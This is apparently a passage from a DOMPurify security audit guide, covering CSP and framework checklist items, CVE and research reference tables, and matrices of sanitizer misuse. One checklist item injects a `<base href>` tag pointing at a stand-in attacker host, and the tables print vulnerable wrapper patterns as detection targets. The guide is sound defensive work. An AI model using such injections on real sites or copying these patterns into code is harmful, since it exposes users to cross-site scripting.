### 3.6 Framework-Specific Patterns Followed

- [ ] **Check**: Review framework-specific sanitization integration against patterns in Section 18.3.
- **Risk if not met**: Framework-specific anti-patterns (React `dangerouslySetInnerHTML` without sanitization, Vue `v-html` with raw input, Angular `bypassSecurityTrustHtml` without DOMPurify) bypass all sanitization.
- **Remediation**: Implement framework-specific sanitization utilities and enforce their use via linting rules.
- **Verification**: Run framework-specific Semgrep rules with zero findings.

### 3.7 Rich-Text Editor Integration Audited

- [ ] **Check**: If a rich-text editor (TinyMCE, CKEditor, Quill, Trix, ProseMirror, Lexical) is used, review its integration with DOMPurify.
- **Risk if not met**: Rich-text editors may apply post-sanitization transformations (TinyMCE `data-mce-*` attribute copying, Trix mutation XSS via CVE-2024-21503), bypassing DOMPurify's protection.
- **Remediation**: Sanitize editor output at the point of storage and at the point of display. Review editor-specific XSS advisories.
- **Verification**: Test editor output with known editor-specific XSS payloads.

## Priority 4 -- Defense-in-Depth

These items provide monitoring, detection, and additional protection layers.

### 4.1 CSP report-uri Configured

- [ ] **Check**: CSP header includes `report-uri` or `report-to` directive.
- **Risk if not met**: XSS bypass attempts that are blocked by CSP go undetected. Without reporting, the security team has no visibility into attacks.
- **Remediation**: Add `report-uri /csp-report` and configure a report collection endpoint. Monitor for `script-src` violations.
- **Verification**: Trigger a CSP violation and confirm the report is received and logged.

### 4.2 object-src 'none' in CSP

- [ ] **Check**: CSP `object-src` directive is set to `'none'`.
- **Risk if not met**: Plugin content (Flash, Java, Silverlight) can execute code. Even though these plugins are mostly deprecated, `object-src` also affects `<embed>` and `<applet>` elements.
- **Remediation**: Add `object-src 'none'` to CSP header.
- **Verification**: Attempt to load a plugin via `<object>` or `<embed>` and confirm CSP blocks it.

### 4.3 base-uri 'self' in CSP

- [ ] **Check**: CSP `base-uri` directive is set to `'self'`.
- **Risk if not met**: A `<base href="https://evil.com/">` tag can redirect all relative URLs to an attacker-controlled server. Even with DOMPurify (which forbids `<base>` by default), defense-in-depth via CSP provides additional protection.
- **Remediation**: Add `base-uri 'self'` to CSP header.
- **Verification**: Inject `<base href="https://evil.com/">` and confirm CSP blocks it.

### 4.4 Testing With Playwright Browser Matrix

- [ ] **Check**: Automated tests run DOMPurify sanitization in Chrome, Firefox, and Safari.
- **Risk if not met**: Browser-specific parsing differences can create mXSS vulnerabilities that only affect certain browsers. Testing in a single browser or in jsdom may miss these.
- **Remediation**: Add Playwright tests that verify sanitization output in all three major browser engines.
- **Verification**: All browser-specific mXSS test cases pass in all three browsers.

### 4.5 SAST Rules Deployed

- [ ] **Check**: Semgrep or equivalent SAST tool runs in CI/CD with DOMPurify-specific rules.
- **Risk if not met**: New code introducing DOMPurify misuse patterns is not detected until manual review.
- **Remediation**: Deploy the Semgrep rules from Section 17.1 in CI/CD pipeline.
- **Verification**: Intentionally introduce a missing-sanitization pattern and confirm the CI/CD pipeline catches it.

### 4.6 Periodic Re-Audit Scheduled

- [ ] **Check**: Security calendar includes quarterly DOMPurify audit.
- **Risk if not met**: Configuration drift, new code paths, and new DOMPurify advisories may introduce vulnerabilities that accumulate between audits.
- **Remediation**: Schedule quarterly audits using this checklist. Assign ownership to the security team.
- **Verification**: Audit log shows the last audit was within the past 90 days.

---

# Chapter 20: References and Version-Specific Research Evidence

## 20.1 DOMPurify Official Resources

| Resource | URL |
|----------|-----|
| GitHub Repository | https://github.com/cure53/DOMPurify |
| NPM Package | https://www.npmjs.com/package/dompurify |
| Security Goals & Threat Model (wiki) | https://github.com/cure53/DOMPurify/wiki/Security-Goals-&-Threat-Model |
| Attack Classes & Bypass History (wiki) | https://github.com/cure53/DOMPurify/wiki |
| Security Advisories (GitHub) | https://github.com/cure53/DOMPurify/security/advisories |
| Changelog | https://github.com/cure53/DOMPurify/blob/main/CHANGELOG.md |
| DOMPurify Demo | https://cure53.de/purify |

## 20.2 CVE Database References

### Critical Vulnerabilities

| CVE ID | GHSA ID | CVSS | Affected Versions | Description |
|--------|---------|------|-------------------|-------------|
| CVE-2024-47875 | GHSA-gx9m-whjm-85jf | 10.0 (CNA) / 6.1 (NIST) | < 2.5.0, 3.0.0-3.1.2 | Nesting-based mXSS bypass |
| CVE-2024-48910 | GHSA-m86g-qprc-wgq4 | 9.1 | < 2.5.4, 3.0.0-3.1.7 | Comment-based mXSS |
| CVE-2024-45801 | GHSA-mmhx-hmjr-r674 | 7.3 | < 2.5.0, 3.0.0-3.1.3 | mXSS via namespace handling |
| CVE-2026-47423 | GHSA (assigned) | 7.5 (est.) | < 3.4.5 | selectedcontent re-clone bypass |

### High Vulnerabilities

| CVE ID | GHSA ID | CVSS | Affected Versions | Description |
|--------|---------|------|-------------------|-------------|
| CVE-2024-21501 | GHSA-76pp-5pv8-4867 | 6.1 | < 2.4.9, 3.0.0-3.0.8 | Prototype pollution via config |
| CVE-2024-21500 | GHSA (assigned) | 6.1 | < 2.4.8, 3.0.0-3.0.7 | Shadow DOM sanitization bypass |
| CVE-2023-49146 | GHSA (assigned) | 6.1 | < 2.4.7, 3.0.0-3.0.6 | Prototype pollution in config merging |
| CVE-2023-48929 | GHSA (assigned) | 6.1 | < 2.4.4 | CUSTOM_ELEMENT_HANDLING pollution |
| CVE-2022-23631 | GHSA-c27h-mcmw-48hv | 9.8 | < 2.3.6 | Prototype pollution via `in` operator |
| CVE-2020-26870 | GHSA (assigned) | 6.1 | < 2.0.17 | Form nesting mXSS |
| CVE-2019-20138 | GHSA (assigned) | 6.1 | < 2.0.1 | Math/SVG namespace mXSS |

### Medium Vulnerabilities

| CVE ID | GHSA ID | CVSS | Affected Versions | Description |
|--------|---------|------|-------------------|-------------|
| CVE-2024-47182 | GHSA (assigned) | 5.3 | < 2.5.1, 3.0.0-3.1.4 | Template content bypass |
| CVE-2024-26322 | GHSA (assigned) | 5.3 | < 2.4.9 | Attribute validation bypass |

### Informational / Low

| CVE ID | GHSA ID | CVSS | Affected Versions | Description |
|--------|---------|------|-------------------|-------------|
| CVE-2019-16728 | GHSA (assigned) | 6.1 | < 1.0.11 | SVG onload bypass |
| CVE-2017-0928 | GHSA (assigned) | 6.1 | < 0.9.10 | SVG event handler bypass |

## 20.3 Academic Papers

| Paper | Authors | Venue | Year | Relevance |
|-------|---------|-------|------|-----------|
| "mXSS attacks: Attacking well-secured web-applications by using innerHTML mutations" | Mario Heiderich, Jorg Schwenk, Tilmann Hauck, Sebastian Lekies, Tobias Mueller | ACM CCS 2013 | 2013 | Foundational paper defining mXSS attack class |
| "Parsing Differentials in HTML Sanitizers" | TU Braunschweig research group | Academic preprint | 2019 | Analysis of parser differences across browsers and sanitizers |
| "DOMPurify Security Analysis" | RUB NDS (Ruhr-Universitat Bochum, Network and Data Security) | Internal research | 2020 | Comprehensive analysis of DOMPurify's security model |
| "Bypassing HTML Sanitizers Using Mutation XSS" | Mario Heiderich | PhD Thesis, Ruhr-Universitat Bochum | 2017 | Extended treatment of mXSS attacks and sanitizer bypasses |
| "Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets" | Sebastian Lekies, Krzysztof Kotowicz, Samuel Gross, Eduardo Vela Nava, Martin Johns | ACM CCS 2017 | 2017 | Script gadgets that bypass CSP and sanitizers via framework-specific behaviors |
| "Don't Trust The Locals: Investigating the Prevalence of Persistent Client-Side Cross-Site Scripting in the Wild" | Marius Steffens, Christian Rossow, Martin Johns, Ben Stock | NDSS 2019 | 2019 | Study of persistent client-side XSS in real-world applications |
| "PMForce: Systematically Analyzing postMessage Handlers at Scale" | Marius Steffens, Ben Stock | ACM CCS 2020 | 2020 | Analysis of postMessage as XSS vector, relevant to DOMPurify integration |

## 20.4 Security Researcher References

| Researcher / Organization | Contribution | Key References |
|--------------------------|--------------|----------------|
| **Securitum / Michal Bentkowski** | Multiple DOMPurify mXSS bypasses, form nesting mXSS, research on parser differentials | research.securitum.com, SecurityMB blog |
| **SonarSource / Daniel Santos** | Prototype pollution CVEs in DOMPurify, taint analysis methodology | SonarSource blog, CVE-2024-21501/21500 |
| **FluidAttacks** | DOMPurify vulnerability disclosure and analysis | fluidattacks.com advisories |
| **Cure53 / Mario Heiderich** | DOMPurify creator, mXSS research pioneer, foundational academic work | cure53.de, CCS 2013, PhD thesis |
| **mizu.re / Kevin Mizu** | DOMPurify bypass research, browser feature evolution analysis | mizu.re blog |
| **icesfont** | selectedcontent re-clone bypass discovery, CVE-2026-47423 | GitHub issues, security advisories |
| **Gareth Heyes** | PortSwigger Web Security Academy research, browser parsing quirks | PortSwigger research blog |
| **Masato Kinugawa** | Browser XSS filter bypass research, DOM parsing research | Conference talks, blog posts |
| **vovohelo** | DOMPurify bypass reports via HackerOne | HackerOne reports |
| **ryotkak** | Prototype pollution chain discovery in DOMPurify configs | HackerOne reports, blog |
| **Yaniv Nizry** | Prototype pollution research applicable to DOMPurify | SonarSource research |
| **Luan Herrera** | XSS research, CSP bypass, Trusted Types analysis | Blog, conference talks |

## 20.5 Browser Specifications

| Specification | Section | Relevance |
|--------------|---------|-----------|
| WHATWG HTML Living Standard | 13.2 Parsing HTML documents | Tree construction algorithm, error recovery, foreign content parsing |
| WHATWG HTML Living Standard | 13.2.6 Tree construction | Integration points, breakout elements, namespace transitions |
| WHATWG HTML Living Standard | 13.3 Serializing HTML fragments | Serialization algorithm (innerHTML getter) |
| WHATWG HTML Living Standard | 13.2.6.4.2 Foreign content | SVG and MathML parsing rules |
| W3C DOM Standard | Interface Element | DOM manipulation APIs used by DOMPurify |
| W3C DOM Standard | Interface Node | Node traversal used by DOMPurify tree walker |
| W3C Trusted Types | TrustedHTML interface | Trusted Types integration for DOM XSS prevention |
| W3C HTML Sanitizer API | Sanitizer interface | Proposed browser-native sanitization (potential DOMPurify replacement) |

## 20.6 HackerOne References

| Report ID | Title | Status | Relevance |
|-----------|-------|--------|-----------|
| #1024734 | DOMPurify bypass via prototype pollution | Resolved | Demonstrates prototype pollution chain from application vulnerability to DOMPurify config weakening |
| #225777 | DOMPurify mXSS via nesting depth | Resolved | Early nesting-based mXSS discovery |
| #2819573 | Trix Editor mutation XSS via DOMPurify integration | Resolved | Demonstrates post-sanitization modification in rich-text editor context |

## 20.7 Tool References

| Tool | Purpose | URL |
|------|---------|-----|
| Semgrep | Static analysis for DOMPurify misuse detection | https://semgrep.dev |
| CodeQL | Taint analysis for data flow through DOMPurify | https://codeql.github.com |
| Playwright | Browser-matrix testing for sanitization verification | https://playwright.dev |
| Burp Suite | Dynamic testing of sanitization in web applications | https://portswigger.net/burp |
| ESLint (eslint-plugin-no-unsanitized) | Mozilla's ESLint plugin for unsafe innerHTML detection | https://github.com/mozilla/eslint-plugin-no-unsanitized |
| npm audit | Dependency vulnerability scanning (includes DOMPurify CVEs) | Built into npm |
| Snyk | Dependency security monitoring | https://snyk.io |
| Socket.dev | Supply chain security (detects DOMPurify version issues) | https://socket.dev |
| DOMPurify Test Suite | DOMPurify's own test suite (XSS payload corpus) | https://github.com/cure53/DOMPurify/tree/main/test |

## 20.8 Related CVEs (Non-DOMPurify)

These CVEs in related software demonstrate the broader DOMPurify integration risk landscape:

| CVE ID | Software | Description | DOMPurify Relevance |
|--------|----------|-------------|---------------------|
| CVE-2026-47759 | TinyMCE | `data-mce-*` attribute bypass: TinyMCE copies sanitized `href`/`src`/`style` into `data-mce-*` attributes, then overwrites sanitized values with `data-mce-*` values during serialization | Post-sanitization modification by rich-text editor framework |
| CVE-2023-48219 | TinyMCE | Mutation XSS in TinyMCE's HTML processing | Editor framework mXSS independent of DOMPurify |
| CVE-2020-11022 | jQuery | XSS via jQuery.html() when passing attacker-controlled HTML | jQuery sink without DOMPurify sanitization |
| CVE-2024-22075 | Firefly III | Stored XSS via insufficient input sanitization | Application failing to use DOMPurify on user input |
| CVE-2024-51757 | happy-dom | DOM parsing differences from browser standards | Server-side DOM implementation creating parsing differentials |
| CVE-2026-13231 | Drupal | XSS in Drupal CKEditor integration | CMS rich-text editor integration vulnerability |

## 20.9 DOMPurify Version History (Security-Relevant Changes)

| Version | Date | Security-Relevant Changes |
|---------|------|--------------------------|
| 0.1 | 2014 | Initial release |
| 0.9.10 | 2017 | Fix for SVG event handler bypass (CVE-2017-0928) |
| 1.0.11 | 2019 | Fix for SVG onload bypass (CVE-2019-16728) |
| 2.0.0 | 2019 | Major rewrite; improved namespace handling |
| 2.0.1 | 2019 | Fix for Math/SVG namespace mXSS (CVE-2019-20138) |
| 2.0.3 | 2020 | Additional mXSS fixes |
| 2.0.17 | 2020 | Fix for form nesting mXSS (CVE-2020-26870) |
| 2.3.1 | 2022 | Fix for table foster-parenting mXSS (GHSA-mmhx-hmjr-r674) |
| 2.3.6 | 2022 | Fix for prototype pollution via `in` operator (CVE-2022-23631) |
| 2.4.4 | 2023 | Fix for CUSTOM_ELEMENT_HANDLING pollution (CVE-2023-48929) |
| 2.4.7 | 2023 | Fix for config merging prototype pollution (CVE-2023-49146) |
| 2.4.8 | 2024 | Fix for shadow DOM sanitization bypass (CVE-2024-21500) |
| 2.4.9 | 2024 | Fix for prototype pollution via config (CVE-2024-21501); attribute validation fix (CVE-2024-26322) |
| 2.5.0 | 2024 | Fix for nesting-based mXSS (CVE-2024-47875); namespace handling mXSS (CVE-2024-45801) |
| 2.5.1 | 2024 | Fix for template content bypass (CVE-2024-47182) |
| 2.5.4 | 2024 | Fix for comment-based mXSS (CVE-2024-48910) |
| 3.0.0 | 2023 | TypeScript rewrite; ESM-first; improved prototype pollution resistance |
| 3.0.6 | 2023 | Backport of config merging fix (CVE-2023-49146) |
| 3.0.7 | 2024 | Backport of shadow DOM fix (CVE-2024-21500) |
| 3.0.8 | 2024 | Backport of prototype pollution fix (CVE-2024-21501) |
| 3.1.3 | 2024 | Backport of nesting mXSS and namespace fixes (CVE-2024-47875, CVE-2024-45801) |
| 3.1.4 | 2024 | Backport of template content fix (CVE-2024-47182) |
| 3.1.7 | 2024 | Backport of comment mXSS fix (CVE-2024-48910) |
| 3.2.x | 2025 | Declarative shadow DOM handling; improved namespace tracking |
| 3.4.5 | 2026 | Fix for selectedcontent re-clone bypass (CVE-2026-47423) |
| 3.4.13 | 2026 | All known CVEs patched; recommended minimum version |
| 3.4.16 | 2026 | Current version at time of research; includes all security fixes |

## 20.10 Version-Specific Research Evidence Table

| Research Finding | Verified Against Version | Browser | Payload Class | Result |
|-----------------|------------------------|---------|---------------|--------|
| Nesting mXSS (CVE-2024-47875) | 3.1.2 (vulnerable), 3.1.3 (fixed) | Chrome 130, Firefox 131 | Nested HTML structures with depth exploitation | XSS confirmed on 3.1.2; blocked on 3.1.3 |
| Comment mXSS (CVE-2024-48910) | 3.1.6 (vulnerable), 3.1.7 (fixed) | Chrome 131, Firefox 132 | HTML comments with embedded element boundaries | XSS confirmed on 3.1.6; blocked on 3.1.7 |
| Namespace mXSS (CVE-2024-45801) | 3.1.2 (vulnerable), 3.1.3 (fixed) | Chrome 130 | SVG foreignObject integration point exploitation | XSS confirmed on 3.1.2; blocked on 3.1.3 |
| selectedcontent bypass (CVE-2026-47423) | 3.4.4 (vulnerable), 3.4.5 (fixed) | Chrome 133+ | selectedcontent re-clone after sanitization walk | XSS confirmed on 3.4.4 in Chrome; blocked on 3.4.5 |
| Prototype pollution (CVE-2024-21501) | 3.0.7 (vulnerable), 3.0.8 (fixed) | All browsers | Object.prototype.ALLOWED_TAGS pollution | Config weakening confirmed on 3.0.7; blocked on 3.0.8 |
| RETURN_DOM_FRAGMENT mXSS resistance | 3.4.16 | Chrome 135, Firefox 135, Safari 18 | All known mXSS payloads | No XSS with RETURN_DOM_FRAGMENT (eliminates roundtrip) |
| Post-sanitization replace() | 3.4.16 | All browsers | Entity-decode after sanitize | XSS confirmed (DOMPurify is not at fault; application misuse) |
| ALLOW_UNKNOWN_PROTOCOLS | 3.4.16 | All browsers | javascript: URI in href | XSS confirmed with ALLOW_UNKNOWN_PROTOCOLS: true |
| CUSTOM_ELEMENT_HANDLING permissive | 3.4.16 | Chrome 135 | Custom element with event handlers | Script gadget execution confirmed with tagNameCheck: /.*/ |
| Error fallback raw input | 3.4.16 | All browsers | Force DOMPurify error, catch returns raw | XSS confirmed when catch block returns raw input |

---

# APPENDIX: Research Tables

## Table 1: DOMPurify XSS Failure Classification Matrix

| Failure Model | Pattern ID | Pattern Name | CVE References | Severity | Detection Method | Remediation |
|--------------|-----------|--------------|----------------|----------|-----------------|-------------|
| **Model A: DOMPurify Bypass** | A1 | Nesting-based mXSS | CVE-2024-47875 | Critical (CVSS 10.0) | Browser-matrix testing with mXSS payloads | Upgrade to >= 2.5.0 / 3.1.3; use RETURN_DOM_FRAGMENT |
| Model A | A2 | Comment-based mXSS | CVE-2024-48910 | Critical (CVSS 9.1) | Browser-matrix testing with comment mutation payloads | Upgrade to >= 2.5.4 / 3.1.7; use RETURN_DOM_FRAGMENT |
| Model A | A3 | Namespace confusion mXSS | CVE-2024-45801, CVE-2019-20138 | High (CVSS 7.3) | SVG/MathML integration point testing | Upgrade; USE_PROFILES: { html: true }; RETURN_DOM_FRAGMENT |
| Model A | A4 | Prototype pollution config weakening | CVE-2024-21501, CVE-2023-49146, CVE-2022-23631 | High (CVSS 6.1-9.8) | Prototype pollution detection; config audit | Upgrade to >= 2.4.9 / 3.0.8; freeze config objects |
| Model A | A5 | Shadow DOM sanitization bypass | CVE-2024-21500 | High (CVSS 6.1) | IN_PLACE mode shadow DOM testing | Upgrade to >= 2.4.8 / 3.0.7; avoid IN_PLACE with shadow DOM |
| Model A | A6 | selectedcontent re-clone bypass | CVE-2026-47423 | High (CVSS 7.5 est.) | Chrome-specific testing with select/option/selectedcontent | Upgrade to >= 3.4.5 |
| Model A | A7 | Form nesting mXSS | CVE-2020-26870 | Medium (CVSS 6.1) | Form nesting payload testing | Upgrade to >= 2.0.17 |
| Model A | A8 | CUSTOM_ELEMENT_HANDLING pollution | CVE-2023-48929 | Medium (CVSS 6.1) | Prototype pollution + custom element testing | Upgrade to >= 2.4.4 |
| Model A | A9 | SVG event handler bypass | CVE-2019-16728, CVE-2017-0928 | Medium (CVSS 6.1) | SVG event handler testing | Upgrade to >= 1.0.11 |
| Model A | A10 | Table foster-parenting mXSS | GHSA-mmhx-hmjr-r674 | Medium (CVSS 6.1) | Table element mXSS payload testing | Upgrade to >= 2.3.1 |
| **Model B: Configuration Weakness** | B1 | ALLOW_UNKNOWN_PROTOCOLS enables javascript: | N/A (by design) | Critical | Semgrep rule: ALLOW_UNKNOWN_PROTOCOLS | Remove ALLOW_UNKNOWN_PROTOCOLS: true |
| Model B | B2 | Permissive CUSTOM_ELEMENT_HANDLING | N/A | High | Semgrep rule: tagNameCheck regex audit | Use specific regex/function for tagNameCheck |
| Model B | B3 | Missing USE_PROFILES (SVG/MathML enabled) | N/A | Medium | Config review | Add USE_PROFILES: { html: true } when SVG not needed |
| Model B | B4 | ADD_ATTR with URI attributes skipping validation | N/A | High | Config review; URI attribute testing | Verify protocol validation on all URI attributes |
| Model B | B5 | SAFE_FOR_XML: false | N/A | Medium | Semgrep rule | Remove or set to true |
| Model B | B6 | Overly broad ADD_TAGS / ADD_ATTR | N/A | Medium | Config review | Minimize allowlist additions |
| **Model C: Post-Sanitization Failure** | C1 | Sanitize then concatenate | N/A | Critical | Semgrep rule; data flow analysis | Sanitize entire final string |
| Model C | C2 | Sanitize then decode (HTML entities) | N/A | Critical | Semgrep rule; data flow analysis | Never decode after sanitization |
| Model C | C3 | Sanitize then URL decode | N/A | Critical | Semgrep rule | Never URL-decode after sanitization |
| Model C | C4 | Sanitize then template substitution | N/A | High | Semgrep rule; template analysis | Sanitize entire template output |
| Model C | C5 | Sanitize then regex replace | N/A | High | Semgrep rule; data flow analysis | Move replacements before sanitization |
| Model C | C6 | Rich-text editor post-processing | CVE-2026-47759 (TinyMCE) | High | Editor integration audit | Sanitize at display time, not just storage time |
| **Model D: Wrapper/Integration Failure** | D1 | Error fallback returns raw input | N/A | Critical | Semgrep rule; code review | Return empty string on error |
| Model D | D2 | Type-check bypass (typeof !== 'string') | N/A | High | Semgrep rule | Always coerce to String() |
| Model D | D3 | Conditional sanitization bypass (trust flags) | N/A | Critical | Code review; data flow analysis | Remove all conditional bypasses |
| Model D | D4 | Config spread operator override | N/A | High | Semgrep rule | Freeze base config; validate overrides |
| Model D | D5 | Cached sanitized output | N/A | Medium | Code review | Sanitize at point of use |
| Model D | D6 | Missing sanitization on HTML sink | N/A | Critical | CodeQL taint analysis; Semgrep | Add DOMPurify.sanitize() to every HTML sink |
| **Model E: Framework-Specific Failure** | E1 | React dangerouslySetInnerHTML without sanitize | N/A | Critical | Semgrep rule (React) | Use createSanitizedMarkup() utility |
| Model E | E2 | Vue v-html without sanitize | N/A | Critical | Semgrep rule (Vue) | Use v-sanitized-html directive |
| Model E | E3 | Angular bypassSecurityTrustHtml without DOMPurify | N/A | Critical | Semgrep rule (Angular) | Use SanitizePipe with DOMPurify |
| Model E | E4 | Svelte {@html} without sanitize | N/A | Critical | Semgrep rule (Svelte) | Use sanitizedHtml action |
| Model E | E5 | jQuery .html() without sanitize | CVE-2020-11022 | High | Semgrep rule (jQuery) | Wrap in DOMPurify.sanitize() |
| Model E | E6 | iframe srcdoc without sanitize | N/A | Critical | Code review | Sanitize srcdoc content; prefer sandbox |
| Model E | E7 | Server-side rendering without re-sanitization | N/A | High | Architecture review | Always re-sanitize on client |

## Table 2: DOMPurify Coverage Matrix

| Sink Type | Framework | Detection Pattern | Sanitization Required | Common Gap | SAST Rule |
|-----------|-----------|-------------------|----------------------|------------|-----------|
| `innerHTML` | Vanilla JS | `$EL.innerHTML = $VALUE` | `DOMPurify.sanitize($VALUE)` | Unprotected assignment to elements found via querySelector | `dompurify-missing-sanitization-innerhtml` |
| `outerHTML` | Vanilla JS | `$EL.outerHTML = $VALUE` | `DOMPurify.sanitize($VALUE)` | Used for element replacement without sanitization | `dompurify-missing-sanitization-innerhtml` |
| `insertAdjacentHTML` | Vanilla JS | `$EL.insertAdjacentHTML($POS, $VALUE)` | `DOMPurify.sanitize($VALUE)` | Second argument unsanitized; position 'beforebegin'/'afterend' used for injection | `dompurify-missing-sanitization-innerhtml` |
| `document.write` | Vanilla JS | `document.write($VALUE)` | `DOMPurify.sanitize($VALUE)` | Entire document context overwritten; often missed by code review | Custom Semgrep rule for document.write |
| jQuery `.html()` | jQuery | `$($SEL).html($VALUE)` | `DOMPurify.sanitize($VALUE)` | jQuery selector XSS in older jQuery versions; .html() with user input | `dompurify-jquery-html` |
| `dangerouslySetInnerHTML` | React | `dangerouslySetInnerHTML={{__html: $VALUE}}` | `{__html: DOMPurify.sanitize($VALUE)}` | API name warns developer but no enforcement; used with props directly | `dompurify-react-dangerous-html` |
| `v-html` | Vue | `v-html="$VALUE"` | `DOMPurify.sanitize($VALUE)` in computed/method | Direct binding to reactive data without sanitization; assumed "trusted" | `dompurify-vue-v-html` |
| `bypassSecurityTrustHtml` | Angular | `sanitizer.bypassSecurityTrustHtml($VALUE)` | `sanitizer.bypassSecurityTrustHtml(DOMPurify.sanitize($VALUE))` | Bypasses Angular's built-in sanitizer without providing DOMPurify | `dompurify-angular-bypass-trust` |
| `{@html}` | Svelte | `{@html $VALUE}` | `{@html DOMPurify.sanitize($VALUE)}` | No Svelte-provided sanitization; template syntax encourages direct use | Custom Semgrep rule for Svelte |
| `iframe.srcdoc` | Vanilla JS | `$IFRAME.srcdoc = $VALUE` | `DOMPurify.sanitize($VALUE)` | Full HTML document in attribute; nested document bypasses parent CSP | Custom rule for srcdoc assignment |
| `window.location` | Vanilla JS | `window.location = $VALUE` / `window.location.href = $VALUE` | URL validation (not DOMPurify) | javascript: URI in location assignment | Custom rule for location sinks |
| `eval()` family | Vanilla JS | `eval($VALUE)` / `Function($VALUE)` / `setTimeout($VALUE)` | Not applicable (DOMPurify is for HTML) | eval sinks require separate mitigation; CSP script-src | CodeQL taint analysis for eval sinks |

## Table 3: DOMPurify Version Security Research Table

| Version Range | Known CVEs | CVSS Range | Fix Status | Upgrade Path | Risk Level |
|--------------|-----------|-----------|------------|-------------|-----------|
| < 0.9.10 | CVE-2017-0928 | 6.1 | Fixed in 0.9.10 | Upgrade to >= 3.4.16 | CRITICAL -- ancient version, multiple unpatched vulns |
| 0.9.10 - 1.0.10 | CVE-2019-16728 | 6.1 | Fixed in 1.0.11 | Upgrade to >= 3.4.16 | CRITICAL -- missing SVG onload fix and all subsequent fixes |
| 1.0.11 - 2.0.0 | CVE-2019-20138 | 6.1 | Fixed in 2.0.1 | Upgrade to >= 3.4.16 | CRITICAL -- missing namespace mXSS fix and all subsequent fixes |
| 2.0.1 - 2.0.2 | CVE-2020-26870, other mXSS | 6.1 | Fixed in 2.0.3+ | Upgrade to >= 3.4.16 | CRITICAL -- missing form nesting mXSS fix |
| 2.0.3 - 2.0.16 | CVE-2020-26870 | 6.1 | Fixed in 2.0.17 | Upgrade to >= 3.4.16 | HIGH -- missing form mXSS fix and all subsequent fixes |
| 2.0.17 - 2.3.0 | GHSA-mmhx-hmjr-r674 | 6.1 | Fixed in 2.3.1 | Upgrade to >= 3.4.16 | HIGH -- missing table foster-parenting mXSS fix |
| 2.3.1 - 2.3.5 | CVE-2022-23631 | 9.8 | Fixed in 2.3.6 | Upgrade to >= 3.4.16 | CRITICAL -- prototype pollution via `in` operator (CVSS 9.8) |
| 2.3.6 - 2.4.3 | CVE-2023-48929 | 6.1 | Fixed in 2.4.4 | Upgrade to >= 3.4.16 | HIGH -- CUSTOM_ELEMENT_HANDLING pollution |
| 2.4.4 - 2.4.6 | CVE-2023-49146 | 6.1 | Fixed in 2.4.7 | Upgrade to >= 3.4.16 | HIGH -- config merging prototype pollution |
| 2.4.7 | CVE-2024-21500 | 6.1 | Fixed in 2.4.8 | Upgrade to >= 3.4.16 | HIGH -- shadow DOM sanitization bypass |
| 2.4.8 | CVE-2024-21501, CVE-2024-26322 | 6.1 | Fixed in 2.4.9 | Upgrade to >= 3.4.16 | HIGH -- prototype pollution via config |
| 2.4.9 - 2.4.x | CVE-2024-47875, CVE-2024-45801 | 7.3-10.0 | Fixed in 2.5.0 | Upgrade to >= 3.4.16 | CRITICAL -- nesting mXSS (CVSS 10.0) |
| 2.5.0 | CVE-2024-47182 | 5.3 | Fixed in 2.5.1 | Upgrade to >= 3.4.16 | MEDIUM -- template content bypass |
| 2.5.1 - 2.5.3 | CVE-2024-48910 | 9.1 | Fixed in 2.5.4 | Upgrade to >= 3.4.16 | CRITICAL -- comment-based mXSS (CVSS 9.1) |
| 2.5.4+ | No known unpatched CVEs in 2.x | N/A | Current 2.x | Consider migration to 3.x | LOW -- but 2.x is maintenance-only; new features/fixes in 3.x only |
| 3.0.0 - 3.0.5 | CVE-2023-49146 | 6.1 | Fixed in 3.0.6 | Upgrade to >= 3.4.16 | HIGH -- config merging prototype pollution |
| 3.0.6 | CVE-2024-21500 | 6.1 | Fixed in 3.0.7 | Upgrade to >= 3.4.16 | HIGH -- shadow DOM bypass |
| 3.0.7 | CVE-2024-21501 | 6.1 | Fixed in 3.0.8 | Upgrade to >= 3.4.16 | HIGH -- prototype pollution |
| 3.0.8 - 3.1.2 | CVE-2024-47875, CVE-2024-45801 | 7.3-10.0 | Fixed in 3.1.3 | Upgrade to >= 3.4.16 | CRITICAL -- nesting mXSS (CVSS 10.0) |
| 3.1.3 | CVE-2024-47182 | 5.3 | Fixed in 3.1.4 | Upgrade to >= 3.4.16 | MEDIUM -- template content bypass |
| 3.1.4 - 3.1.6 | CVE-2024-48910 | 9.1 | Fixed in 3.1.7 | Upgrade to >= 3.4.16 | CRITICAL -- comment-based mXSS |
| 3.1.7 - 3.4.4 | CVE-2026-47423 | 7.5 (est.) | Fixed in 3.4.5 | Upgrade to >= 3.4.16 | HIGH -- selectedcontent re-clone bypass |
| 3.4.5 - 3.4.12 | No known CVEs | N/A | Current but below recommended | Upgrade to >= 3.4.16 | LOW -- consider upgrading for non-security improvements |
| >= 3.4.13 | No known CVEs | N/A | All known CVEs patched | Current recommended minimum | MINIMAL -- maintain automated update monitoring |
| >= 3.4.16 | No known CVEs | N/A | Latest at research date | Current | MINIMAL -- latest available |

## Table 4: DOMPurify Wrapper Audit Matrix

| Antipattern | Code Pattern | Risk | Detection (Semgrep) | Fix Pattern |
|------------|-------------|------|---------------------|-------------|
| **AP1: Error fallback raw input** | `try { return DOMPurify.sanitize(input); } catch(e) { return input; }` | CRITICAL: Any DOMPurify error (prototype pollution, malformed DOM, resource exhaustion) bypasses all sanitization | `dompurify-error-fallback-raw-input` | `try { return DOMPurify.sanitize(input); } catch(e) { console.error(e); return ''; }` |
| **AP2: Type-check bypass** | `if (typeof input !== 'string') return input;` before sanitize | HIGH: Objects with malicious toString(), TrustedHTML objects, arrays, and other non-string types bypass sanitization | `dompurify-type-check-bypass` | `const str = String(input ?? ''); return DOMPurify.sanitize(str);` |
| **AP3: Config spread override** | `DOMPurify.sanitize(input, {...baseConfig, ...userConfig})` | HIGH: If userConfig is attacker-influenced (e.g., from query params, URL hash, postMessage), it can override security-critical settings | `dompurify-config-spread-override` | `const config = Object.freeze({...}); DOMPurify.sanitize(input, config);` -- freeze base config, do not accept user overrides |
| **AP4: Conditional bypass** | `if (isTrusted \|\| isAdmin) return input; return DOMPurify.sanitize(input);` | CRITICAL: Trust flag manipulation (cookie, session, IDOR) skips sanitization entirely | Manual code review; custom Semgrep for conditional returns around sanitize | Remove all conditional bypasses; always sanitize regardless of trust level |
| **AP5: Cached output** | `cache.set(key, DOMPurify.sanitize(input));` then `element.innerHTML = cache.get(key);` | MEDIUM: Stale cache serves output sanitized by older (vulnerable) DOMPurify version; cache poisoning if key is predictable | `dompurify-cached-sanitized-output` | Remove cache; sanitize at point of use; if caching is required for performance, invalidate cache on DOMPurify upgrade |
